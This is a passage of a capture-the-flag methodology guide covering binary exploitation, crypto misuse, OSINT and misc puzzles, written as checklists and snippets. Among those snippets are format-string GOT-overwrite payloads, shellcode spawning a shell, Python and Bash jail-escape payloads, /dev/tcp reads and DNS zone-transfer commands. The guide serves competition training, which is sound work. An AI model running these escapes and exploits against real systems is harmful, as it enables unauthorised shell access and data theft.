print(' '.join(f'%{i}$p' for i in range(1,40)))
PY
```

Pwntools:

```python
from pwn import *
payload = fmtstr_payload(offset, {elf.got['printf']: elf.sym['system']})
```

Manual ideas:

- `%p` leaks stack/libc/code pointers.
- `%s` reads pointed-to memory.
- `%n`, `%hn`, `%hhn` write printed byte counts.
- If input is transformed, pre-encode the format string so it arrives intact.

### Heap First Moves

For menu challenges:

```text
Map structs -> allocation sizes -> indexes -> free/edit/show rules.
Look for UAF: show/edit after free.
Look for double free: same pointer can enter tcache twice.
Look for overflow: edit size > allocation size.
Look for leaks: unsorted bin libc pointer, heap pointer, FILE/stdout abuse.
```

Useful GDB:

```gdb
heap
bins
tcachebins
vis_heap_chunks
```

### Shellcode and Bad Characters

```python
from pwn import *
context.arch = 'amd64'
print(asm(shellcraft.sh()))
print(asm(shellcraft.open('/flag') + shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100)))
```

Find bad chars:

```python
bad = b'\x00\x0a\x0d '
payload = bytes(c for c in range(1,256) if c not in bad)
```

### Manual Before Automation

- Read source if provided, but exploit only through the service.
- Confirm crash and exact offset under the same input path as remote.
- Check whether stdin/socket changes buffering or file descriptors.
- Verify leaks with correct endian and libc version.
- Add `ret` alignment if `system` crashes on `movaps`.
- Keep exploit scripts deterministic: `recvuntil`, parse exact lines, assert expected leaks.

### Rabbit Holes

- Trying heap exploitation before confirming a stack ret2win exists.
- Ignoring mitigations and building an impossible plan.
- Hardcoding local libc when remote ships one.
- Forgetting PIE base calculations.
- Assuming fd `3` in ORW.
- Not preserving canary bytes exactly.
- Using local container shortcuts as the solve.
- Not checking if the binary is actually a reverse challenge first.

### Pwn Decision Flow

```text
Can I call win directly?
  Yes -> ret2win
  No -> Need leak?
        No PIE/no canary -> ROP fixed binary
        Canary -> leak canary or avoid stack
        PIE/libc -> leak pointer, calculate base
        Full RELRO -> avoid GOT overwrite
        Seccomp -> ORW or allowed-syscall plan
        Heap bug -> leak, poison, overwrite hook/vtable/return target
```

### Mental Checklist

- Did I run `file` and `checksec`?
- Did I know the input path and crash offset?
- Did I prove control of RIP/EIP or a write target?
- Did I identify leaks and base addresses?
- Did I account for PIE, canary, NX, RELRO, seccomp?
- Does the exploit get the flag through the exposed service?

---

## Crypto

### Core Methodology

Crypto CTFs are usually about misuse, not breaking standard cryptography. Identify the primitive, parameters, threat model, and what the challenge lets you query or choose.

Work backwards from the required output:

```text
Need plaintext? -> recover key, exploit mode, oracle, bad randomness, math weakness
Need forge? -> MAC/signature misuse, malleability, length extension, nonce reuse
Need factor/discrete log? -> bad parameters, small values, shared factors, smooth groups
```

### Enumeration Workflow

1. Parse all given values and lengths.

```bash
rg -n '[A-Fa-f0-9]{16,}|[A-Za-z0-9+/=]{20,}' .
python3 - <<'PY'
from pathlib import Path
for p in Path('.').glob('*'):
    if p.is_file():
        print(p, p.stat().st_size)
PY
```

2. Identify encodings before cryptography:

```text
Hex length even? Base64 charset? Base32? URL encoded? PEM? ASN.1? JWT?
```

3. Identify primitive:

| Clue | Primitive |
|---|---|
| `n,e,c`, `p,q,d` | RSA |
| `r,s,z`, reused `r` | ECDSA/DSA |
| `iv`, 16-byte blocks | AES-CBC/CTR/ECB |
| repeated 16-byte blocks | ECB |
| same nonce/IV with stream mode | XOR keystream reuse |
| `sha256(secret + msg)` | Length extension |
| random seed/time | Predictable RNG |
| matrix/lattice/noisy equations | LLL/CVP/Sage |

4. Write a verifier before attacking. Your script should confirm encryption/decryption/signature math on known data.

### Common Attack Patterns

| Pattern | Indicator | Attack |
|---|---|---|
| XOR single byte | One-byte key, readable after brute | Try all 256 |
| Repeating XOR | Periodic key, known `flag{` | Recover key positions |
| Two-time pad | `c1 ^ c2 = p1 ^ p2` | Crib dragging |
| AES-ECB | Repeated blocks | Cut-and-paste or byte-at-a-time oracle |
| AES-CBC bit flip | Controlled plaintext and IV/ciphertext | Flip target plaintext bits |
| Padding oracle | Valid/invalid padding responses | Decrypt block by block |
| CTR nonce reuse | Same nonce/key | XOR ciphertexts, recover keystream |
| RSA small e | `e=3`, no padding, small message | Integer root |
| RSA shared prime | Multiple moduli share factor | GCD all moduli |
| RSA common modulus | Same n, different coprime e | Extended gcd combine |
| RSA broadcast | Same message, e small, different n | CRT then integer root |
| Wiener | Small d | Continued fractions |
| Fermat | p and q close | Difference of squares |
| DSA/ECDSA nonce reuse | Same r | Recover nonce and private key |
| Hash length extension | MAC is hash(secret||msg) | Append data and forge digest |
| LCG RNG | Linear recurrence outputs | Solve parameters/state |

### Useful Commands and Snippets

Number parsing:

```python
from Crypto.Util.number import *
x = int('deadbeef', 16)
print(long_to_bytes(x))
print(bytes_to_long(b'flag{test}'))
```

XOR:

```python
def xor(a,b): return bytes(x^y for x,y in zip(a,b))
ct = bytes.fromhex('...')
for k in range(256):
    pt = bytes(c ^ k for c in ct)
    if b'flag{' in pt:
        print(k, pt)
```

Repeating XOR key from known plaintext:

```python
ct = bytes.fromhex('...')
known = b'flag{'
print(bytes(ct[i] ^ known[i] for i in range(len(known))))
```

RSA integer root:

```python
import gmpy2
m, exact = gmpy2.iroot(c, e)
if exact:
    print(int(m).to_bytes((m.bit_length()+7)//8, 'big'))
```

RSA shared factor:

```python
from math import gcd
from Crypto.Util.number import long_to_bytes, inverse
mods = [...]
for i in range(len(mods)):
    for j in range(i):
        p = gcd(mods[i], mods[j])
        if 1 < p < mods[i]:
            q = mods[i] // p
            phi = (p-1)*(q-1)
            d = inverse(e, phi)
            print(long_to_bytes(pow(c, d, mods[i])))
```

Common modulus:

```python
from Crypto.Util.number import long_to_bytes
from gmpy2 import gcdext
g, a, b = gcdext(e1, e2)
assert g == 1
m = (pow(c1, int(a), n) * pow(c2, int(b), n)) % n
print(long_to_bytes(m))
```

CBC bit flip:

```python
def flip(block, old, new, offset):
    b = bytearray(block)
    for i,(o,n) in enumerate(zip(old,new)):
        b[offset+i] ^= o ^ n
    return bytes(b)
```

Hash length extension:

```text
Vulnerable: MD5/SHA1/SHA256(secret || message)
Not vulnerable: HMAC, SHA3, hash(message || secret)
Try secret lengths 1..64 and verify with oracle.
```

### Tools and When to Use Them

| Tool | Use |
|---|---|
| Python + PyCryptodome | Most symmetric/RSA scripts |
| SageMath | Lattices, finite fields, elliptic curves |
| RsaCtfTool | Fast RSA parameter checks |
| `factordb` style lookup | Small/known RSA moduli |
| `hashid`, `haiti` | Hash identification hints |
| CyberChef | Encoding, XOR, ASN.1, quick transforms |
| `openssl asn1parse` | DER/PEM certificate/key parsing |
| `z3` | Bit-vector constraints |

### Manual Before Automation

- Count bytes and block sizes.
- Verify if data is encoded/compressed before encrypted.
- Identify whether IV/nonce is random, fixed, repeated, or attacker-controlled.
- Check for known plaintext: flag prefix, JSON, cookie fields, PKCS headers, PNG/ZIP magic.
- Write decrypt/encrypt helpers and assert round trips.
- Use small toy examples to verify formulas before applying to challenge numbers.

### Rabbit Holes

- Attacking AES instead of bad mode usage.
- Forgetting base64/hex/URL layers.
- Treating HMAC as length-extension vulnerable.
- Using floating point for big integers.
- Missing endian conversion.
- Assuming RSA padding exists when challenge omitted it.
- Ignoring oracle behavior and only doing offline math.
- Not checking `gcd(n_i, n_j)` across provided moduli.

### Crypto Decision Flow

```text
Is this encoding/compression first?
  Yes -> decode until true primitive appears
  No -> Is there an oracle?
        Yes -> classify as padding, timing, equality, signing, encryption oracle
        No -> Inspect parameters
              RSA -> e/n size/gcd/small d/close primes
              Symmetric -> mode/nonce/repeated blocks/malleability
              Signature -> nonce reuse/hash misuse
              RNG -> seed/state recovery
              Equations -> Z3/Sage/LLL
```

### Mental Checklist

- Did I identify primitive, mode, key size, block size, nonce/IV?
- Did I check for known plaintext and repeated data?
- Did I test obvious RSA weaknesses?
- Did I distinguish MAC, hash, signature, and encryption?
- Did I build a verifier?
- Did I keep all big integer math exact?

---

## OSINT

### Core Methodology

OSINT challenges reward disciplined clue preservation. Every visible clue may be meaningful: filenames, timestamps, language, weather, shadows, signs, usernames, EXIF, domains, commit history, social handles, and archive snapshots.

Do not search the whole internet blindly. Extract entities first, then search exact high-signal terms.

### Enumeration Workflow

1. Preserve the original artifact and prompt text.
2. Extract metadata:

```bash
exiftool image.jpg
identify -verbose image.jpg | head -60
pdfinfo document.pdf 2>/dev/null
mediainfo video.mp4 2>/dev/null
```

3. Extract text/entities:

```bash
strings -a -n 5 artifact | tee work/strings.txt
rg -o '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' work/strings.txt
rg -o 'https?://[^ ]+' work/strings.txt
rg -o '@?[A-Za-z0-9_]{3,30}' work/strings.txt | sort -u
```

4. Search by specificity:

```text
"exact phrase from sign"
"username" "team name"
site:example.com "unique phrase"
filetype:pdf "unique organization"
```

5. Corroborate with at least two independent clues before submitting coordinates or names.

### Common OSINT Patterns

| Challenge Type | Clues | Workflow |
|---|---|---|
| Image geolocation | signs, road markings, architecture, vegetation, terrain | Crop distinctive features, reverse search, map verify |
| Username tracking | same handle across sites | Check platforms, profile metadata, old names |
| Domain/DNS | TXT, MX, CNAME, subdomains, zone transfer | `dig`, `whois`, archives, cert transparency |
| Social media | user IDs, post IDs, deleted posts | Archive, APIs, timestamp decoding |
| GitHub leak | commits, issues, PRs, releases, gists | Clone, inspect history, search secrets |
| Archive web | old pages, robots, backups | Wayback CDX, URL patterns |
| Coordinates | MGRS, Plus Codes, EXIF GPS | Convert and verify visually |
| Hash/fingerprint | 32/40/64 hex, SSH key, Tor fingerprint | Identify and search exact value |

### Useful Commands

DNS:

```bash
dig target.com
dig -t txt target.com
dig -t mx target.com
dig -t ns target.com
dig axfr @ns1.target.com target.com
whois target.com
```

Certificate transparency:

```bash
curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u
```

Wayback CDX:

```bash
curl -s 'https://web.archive.org/cdx?url=example.com/*&output=json&fl=timestamp,original,statuscode,mimetype&filter=statuscode:200' | jq .
```

Git:

```bash
git clone URL repo
cd repo
git log --all --oneline --decorate
git grep -n -i 'flag\|secret\|token\|password' $(git rev-list --all)
git show COMMIT
```

Image prep:

```bash
magick image.jpg -crop 800x400+X+Y work/crop.jpg
magick image.jpg -flop work/flipped.jpg
tesseract image.jpg stdout
```

### Platform Hints

- Twitter/X numeric user IDs survive username changes. Snowflake IDs encode timestamps.
- Discord snowflakes also encode timestamps.
- Tumblr may reveal `x-tumblr-user` headers and avatar paths.
- GitHub issue comments, PR reviews, wikis, deleted branches, and old commits often matter.
- Google Docs/Sheets may expose `/export?format=csv`, `/pub`, `/gviz/tq?tqx=out:csv`, `/htmlview`.
- Tor relay fingerprints are often 40 hex chars.
- 32 hex chars may be MD5, 40 SHA1/Tor fingerprint, 64 SHA256.

### Geolocation Manual Process

1. Determine country/region:
   - Language/script
   - Driving side
   - Road signs
   - Utility poles
   - Lane markings
   - Architecture
   - Terrain/vegetation

2. Extract hard clues:
   - Business names
   - Route numbers
   - Phone prefixes
   - License plates
   - Transit logos
   - Mountain/water orientation

3. Search cropped regions, not just full image.
4. Verify with street view, satellite, and user photos.
5. For coordinates, submit required format exactly.

### Manual Before Automation

- Write down every clue before searching.
- Crop signs/logos/facades separately for reverse image search.
- Flip mirrored text from glass/water.
- Use quotes around exact visible text.
- Verify archive dates against prompt chronology.
- Treat platform username matches as candidates until corroborated.

### Rabbit Holes

- Trusting first reverse image result.
- Confusing reposted images with original location.
- Ignoring EXIF because social sites often strip it; still check.
- Searching broad terms instead of exact phrases.
- Failing to verify coordinates visually.
- Treating username matches across common handles as proof.

### OSINT Decision Flow

```text
Is there a local artifact?
  Yes -> metadata, OCR, strings, reverse image crops
  No -> entities from prompt
Then:
  Domain -> DNS, WHOIS, certs, Wayback
  Username -> cross-platform, archives, IDs
  Image -> geolocate by hard clues, verify on map
  Hash/fingerprint -> identify length/type, exact search
```

### Mental Checklist

- Did I preserve exact prompt and artifact?
- Did I extract metadata/OCR/strings?
- Did I separate hard clues from guesses?
- Did I crop and reverse-search distinctive regions?
- Did I use archives and DNS/cert history when relevant?
- Did I corroborate before submitting?

---

## Misc

### Core Methodology

Misc challenges are constraint puzzles. The first task is classification: encoding, jail, game, VM, audio/RF, QR/barcode, esolang, DNS oddity, cloud/container, or hybrid.

Do not brute force blindly. Map the rules, build an oracle if one exists, and automate the repetitive part.

### Enumeration Workflow

```bash
file mystery
xxd -l 256 mystery
strings -a -n 5 mystery | head -100
binwalk mystery
exiftool mystery 2>/dev/null
```

For remote interactive challenges:

```python
from pwn import *
r = remote('host', 31337)
print(r.recvuntil(b': ', timeout=3))
r.sendline(b'test')
print(r.recvall(timeout=2))
```

For jails:

```text
Map allowed chars -> map allowed syntax -> identify eval context -> build strings/numbers -> escape or read flag.
```

### Common Patterns

| Pattern | Indicator | Technique |
|---|---|---|
| Encoding chain | Text repeatedly decodes | Identify charset, decode one layer at a time |
| QR/barcode | Image with modules, damaged chunks | `zbarimg`, repair, reassemble chunks |
| Audio | WAV/MP3, tones, noise | Spectrogram, SSTV, DTMF, Morse |
| RF/SDR | `.iq`, `.cu8`, `.cf32` | Inspect samples, constellation, demodulate |
| Python jail | `eval`, blocked names/chars | Enumerate filter, `__subclasses__`, escapes |
| Bash jail | restricted chars, rbash | Eval context, `$0`, ANSI-C octal, env substrings |
| Esolang | Brainfuck/Whitespace/Piet | Use interpreter, instrument, translate |
| Game/VM | Custom bytecode/rules | Write emulator/solver, Z3/game theory |
| DNS misc | TXT/NSEC/IXFR/rebinding/tunnel | `dig`, walk zones, extract labels |
| Cloud/container | K8s, Docker, CI hints | Service account, metadata, RBAC, safe lab only |

### Encoding Identification

| Data | Hint |
|---|---|
| `A-Za-z0-9+/=` | Base64 |
| `A-Z2-7=` | Base32 |
| `0-9a-f`, even length | Hex |
| `%7B%22...` | URL encoding |
| `&#x41;`, `\u0041` | HTML/Unicode escapes |
| Groups of dots/dashes | Morse |
| Many CJK chars from ASCII-like source | UTF-16 endian mojibake or base65536 |
| Decimal bytes | ASCII decimal, BCD, char codes |
| Float list | IEEE-754 bytes |

### Useful Commands

QR/barcodes:

```bash
zbarimg image.png
zbarimg -S*.enable image.png
qrencode -o out.png 'data'
```

Audio:

```bash
sox audio.wav -n spectrogram -o work/spec.png
ffmpeg -i audio.mp3 work/audio.wav
multimon-ng -a DTMF work/audio.wav
```

Nested archives:

```bash
while f=$(find . -maxdepth 1 -type f | head -1); do
  file "$f"
  7z x -y "$f" || break
  mkdir -p done
  mv "$f" done/
done
```

Z3:

```python
from z3 import *
xs = [BitVec(f'x{i}', 8) for i in range(16)]
s = Solver()
for x in xs:
    s.add(x >= 32, x <= 126)
# constraints...
if s.check() == sat:
    m = s.model()
    print(bytes(m[x].as_long() for x in xs))
```

IEEE-754 float decoding:

```python
import struct
vals = [240600592, 212.2753143310547]
out = b''.join(struct.pack('>f', float(v)) for v in vals)
print(out)
```

UTF-16 endian fix:

```python
fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
print(fixed)
```

### Python Jail Playbook

Enumeration:

```python
tests = [
    "1+1",
    "'a'",
    "'a'+'b'",
    "().__class__",
    "[]",
    "lambda:1",
    "__import__('os')",
    "open('/flag').read()",
]
```

Classic paths:

```python
# Class hierarchy exploration
().__class__.__mro__[1].__subclasses__()

# Compile/exec if eval only allows expressions
exec(compile('__import__("os").system("sh")', '', 'exec'))

# Build blocked strings
'\x66\x6c\x61\x67'
''.join(['fl','ag'])

# Unicode name tricks may bypass naive filters
```

Oracle pattern:

```python
def find_char(i):
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        res = query(i, mid)
        if res == 0:
            return chr(mid)
        if res < 0:
            lo = mid + 1
        else:
            hi = mid - 1
```

### Bash Jail Playbook

Identify context:

```text
Trailing backslash -> quote/eval errors?
$# expands?
Does whitespace pass?
Are quotes blocked?
Is input wrapped in eval "$input" or eval $input?
```

Payload ideas:

```bash
# ANSI-C octal
$'\057\142\151\156\057\163\150'

# HISTFILE file read trick
HISTFILE=/flag /bin/bash
history

# bash verbose mode
bash -v /flag

# /dev/tcp without nc
cat < /dev/tcp/127.0.0.1/PORT
```

Minimal charset insight:

```text
$# -> 0
$$ -> PID digits
$0 -> shell name in many contexts
\$ plus $# can become $0 in double-quoted eval contexts
```

### DNS Misc

```bash
dig -t txt target
dig -t ns target
dig axfr @ns.target target
dig +short TXT name
dig +dnssec target
```

Look for:

- TXT records with base64/hex.
- NSEC/NSEC3 zone walking.
- Long subdomain labels carrying data.
- ECS/client-subnet behavior.
- Rebinding or internal host assumptions in web hybrids.

### Manual Before Automation

- Classify the puzzle before solving.
- Decode one layer and inspect output before applying another.
- For jails, enumerate constraints systematically.
- For games, model the rules and state transitions.
- For VMs, write a disassembler before an emulator.
- For audio/RF, visualize first.
- For interactive remotes, script the protocol only after manually reading one full exchange.

### Rabbit Holes

- Using CyberChef Magic without understanding the layers.
- Missing ambiguous encodings: hex is also valid base64 characters.
- Treating all weird text as crypto.
- Trying jail escapes before mapping blocked characters.
- Not saving session cookies/checkpoints for game brute force.
- Ignoring stdout/stderr differences as an oracle.
- Brute forcing huge spaces instead of deriving constraints.

### Misc Decision Flow

```text
Can I identify a known format?
  Yes -> use format-specific tools
  No -> Is there an oracle?
        Yes -> map inputs/outputs, automate extraction
        No -> Is it a constraint system?
              Yes -> Z3/Sage/game solver
              No -> inspect bytes, metadata, visuals, entropy, strings
```

### Mental Checklist

- Did I identify the exact puzzle class?
- Did I inspect bytes, strings, and metadata?
- Did I map constraints before escaping/brute forcing?
- Did I decode layers in a verifiable order?
- Did I use a solver only after modeling the rules?
- Did I save all intermediate outputs?

---

## Final Competition Checklist

Before submitting a flag or asking for help:

- I can explain the challenge type in one sentence.
- I know where the flag came from physically or logically.
- I have a minimal reproducible command/script.
- I did not rely on local-only secrets, setup defaults, or container shortcuts.
- I recorded decisive evidence in notes.
- I checked for fake flags and decoys.
- I validated the exact flag format and copied it without extra whitespace.

When prioritizing challenges:

- Take quick wins first: obvious strings, metadata, route leaks, ret2win, weak RSA.
- Park challenges with no primitive after a timebox.
- Return with fresh hypotheses, not more random commands.
- Share concise notes with teammates: facts, failed paths, current best hypothesis, next test.

The strongest manual habit is restraint: observe, test, and prove. Automation is powerful only after you know what you are automating.
